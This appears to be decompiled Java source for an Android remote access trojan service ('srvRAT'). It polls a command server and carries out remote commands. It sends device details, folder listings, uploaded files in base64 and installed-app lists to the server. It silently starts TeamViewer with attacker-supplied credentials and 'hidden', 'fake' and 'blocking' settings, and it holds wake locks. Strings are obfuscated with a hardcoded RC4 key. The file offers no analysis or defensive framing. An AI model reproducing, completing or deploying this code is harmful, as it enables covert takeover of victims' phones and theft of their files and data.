package com.example.mmm.Service;

import android.app.IntentService;
import android.content.Intent;
import android.content.pm.ApplicationInfo;
import android.content.pm.PackageManager;
import android.os.Environment;
import android.os.PowerManager;
import android.os.PowerManager.WakeLock;
import android.util.Base64;
import com.example.mmm.constants;
import com.example.mmm.API.ClassRC4;
import com.example.mmm.Utils.utils;
import java.io.File;
import java.util.Iterator;
import org.json.JSONObject;

public class srvRAT extends IntentService {
   utils after$ = new utils();
   constants losses$ = new constants();
   private String learn$;
   private WakeLock alloy$;

   public srvRAT() {
      super("");
      StringBuilder var1 = new StringBuilder();
      var1.append(srvRAT.class.getSimpleName());
      var1.append("   ");
      this.learn$ = var1.toString();
   }

   private String decrypt_str(String var1) {
      var1 = new String((new ClassRC4("wewiejvtlfqy".getBytes()))._nevada(utils.hexStringToByteArray(new String(Base64.decode(var1, 0), "UTF-8"))));
      return var1;
   }

   protected void onHandleIntent(Intent var1) {
      String var5 = this.after$.SettingsRead(this, "QQ");

      while(true) {
         while(true) {
            utils.chalkTile(1000);
            if (this.after$.SettingsRead(this, "RQ").equals("disconnect")) {
               this.stopSelf();
               return;
            }

            JSONObject var9 = new JSONObject();
            var9.put("ID", var5);
            var9.put("screen", utils._janet(this));
            var9.put("active_app", this.after$.SettingsRead(this, "RW"));
            var9.put("perm_storage", utils.hasPermission(this, "android.permission.WRITE_EXTERNAL_STORAGE"));
            utils var4 = this.after$;
            utils var6 = this.after$;
            StringBuilder var7 = new StringBuilder();
            var7.append("q=rat_connect&ws=");
            var7.append(this.after$._grown(var9.toString()));
            String var10 = var4._marina(var6._brought(this, var7.toString()));
            String var12 = utils._efforts((new JSONObject(var10)).getString("rat_cmd"));
            var6 = this.after$;
            String var17 = this.learn$;
            StringBuilder var8 = new StringBuilder();
            var8.append("rat_cmd_base64_decode: ");
            var8.append(var10);
            var8.append(" >>  ");
            var8.append(var12);
            var6.Log(var17, var8.toString());
            if (var12.equals("rat_disconnect")) {
               this.after$.SettingsWrite(this, "RQ", "disconnect");
            } else {
               boolean var3 = var12.contains("open_folder");
               int var2 = 0;
               StringBuilder var18;
               if (var3) {
                  var12 = (new JSONObject(var12)).getString("open_folder");
                  var10 = var12;
                  if (var12.equals("~/")) {
                     Environment.getExternalStorageDirectory();
                     var10 = null;
                  }

                  Object var10002 = null;
                  String[] var14 = this.after$._pants((File)null);
                  JSONObject var20 = new JSONObject();
                  var20.put("cmd", "array_files_folder");
                  var20.put("dir", utils._cookie(var10));
                  var20.put("folders", utils._cookie(var14[0]));
                  var20.put("files", utils._cookie(var14[1]));
                  var10 = var20.toString().replace("\\n", "");
                  this.after$.Log("JSON_SEND", var10);
                  var4 = this.after$;
                  var18 = new StringBuilder();
                  var18.append("q=rat_cmd&ws=");
                  var18.append(this.after$._grown(var10));
                  var4._brought(this, var18.toString());
               } else {
                  String var16;
                  if (var12.contains("uploadind_file")) {
                     var9 = new JSONObject(var12);
                     Object var10001 = null;
                     var9.getString("uploadind_file");
                     var4 = null;
                     var16 = Base64.encodeToString(utils._update(var4), 0);
                     var9 = new JSONObject();
                     var9.put("cmd", "saved_file");
                     var9.put("ID", var5);
                     var9.put("name", (Object)null);
                     var9.put("file_base64", var16);
                     var4 = this.after$;
                     var18 = new StringBuilder();
                     var18.append("q=rat_cmd&ws=");
                     var18.append(this.after$._grown(var9.toString()));
                     var4._brought(this, var18.toString());
                  } else {
                     var3 = var12.contains("get_apps");
                     if (!var3) {
                        if (var12.contains("connect_teamviewer")) {
                           var9 = new JSONObject(var12);
                           this.after$.SettingsWrite(this, "RT", var9.getString("connect_teamviewer"));
                           this.after$.SettingsWrite(this, "RY", var9.getString("password"));
                           this.after$.SettingsWrite(this, "RS", var9.getString("fake"));
                           this.after$.SettingsWrite(this, "RI", var9.getString("hidden"));
                           this.after$.SettingsWrite(this, "RA", var9.getString("blocking"));
                           this.after$._bhutan(this);
                           utils.runApplication(this, "com.teamviewer.host.market");
                        } else if (var12.contains("open_teamviewer")) {
                           var9 = new JSONObject(var12);
                           this.after$.SettingsWrite(this, "RS", var9.getString("fake"));
                           this.after$.SettingsWrite(this, "RI", var9.getString("hidden"));
                           this.after$.SettingsWrite(this, "RA", var9.getString("blocking"));
                           this.after$._bhutan(this);
                           utils.runApplication(this, "com.teamviewer.host.market");
                        } else if (var12.contains("send_settings")) {
                           var9 = new JSONObject(var12);
                           this.after$.SettingsWrite(this, "RS", var9.getString("fake"));
                           this.after$.SettingsWrite(this, "RI", var9.getString("hidden"));
                           this.after$.SettingsWrite(this, "RA", var9.getString("blocking"));
                           this.after$._bhutan(this);
                        } else if (var12.contains("device_unlock")) {
                           var9 = new JSONObject(var12);
                           this.after$.SettingsWrite(this, "RS", var9.getString("fake"));
                           this.after$.SettingsWrite(this, "RI", var9.getString("hidden"));
                           this.after$.SettingsWrite(this, "RA", var9.getString("blocking"));
                           if (this.alloy$ != null) {
                              this.alloy$.release();
                           }

                           this.alloy$ = ((PowerManager)this.getSystemService("power")).newWakeLock(805306394, this.getClass().getName());
                           this.alloy$.acquire();
                        }
                     } else {
                        this.after$.Log(this.learn$, "GET APPS 1");
                        JSONObject var13 = new JSONObject();
                        PackageManager var11 = this.getPackageManager();
                        Iterator var15 = var11.getInstalledApplications(0).iterator();

                        while(var15.hasNext()) {
                           ApplicationInfo var19 = (ApplicationInfo)var15.next();
                           if (var11.getLaunchIntentForPackage(var19.packageName) != null) {
                              var13.put(String.valueOf(var2), var19.packageName);
                              ++var2;
                           }
                        }

                        var9 = new JSONObject();
                        var9.put("cmd", "saved_apps");
                        var9.put("apps", utils._cookie(var13.toString()));
                        this.after$.Log(this.learn$, "GET APPS 2");
                        var4 = this.after$;
                        var16 = this.learn$;
                        var7 = new StringBuilder();
                        var7.append("JSON: ");
                        var7.append(var9.toString());
                        var4.Log(var16, var7.toString());
                        var4 = this.after$;
                        var18 = new StringBuilder();
                        var18.append("q=rat_cmd&ws=");
                        var18.append(this.after$._grown(var9.toString()));
                        var4._brought(this, var18.toString());
                     }
                  }
               }
            }
         }
      }
   }
}
